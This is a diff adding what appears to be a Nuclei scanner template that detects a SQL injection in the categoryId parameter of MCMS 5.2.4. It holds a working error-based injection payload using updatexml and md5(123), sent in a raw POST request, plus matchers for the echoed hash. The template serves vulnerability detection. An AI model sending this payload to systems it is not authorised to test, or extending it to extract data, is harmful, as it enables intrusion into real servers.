@@ -1,0 +1,28 @@
+id: mcms-categoryid-sqli
+info:
+  name: MCMS 5.2.4 categoryId SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MCMS 5.2.4 contains a SQL injection vulnerability in the categoryId parameter, allowing attackers to retrieve sensitive information and potentially control the server.
+  tags: sqli
+  reference:
+    - https://gitee.com/mingSoft/MCMS
+    - https://forum.butian.net/share/998
+http:
+  - raw:
+      - |
+        POST /cms/content/list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        categoryId=1' and updatexml(1,concat(0x7e,md5(123),0x7e),1) and '1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b7"
+        part: body
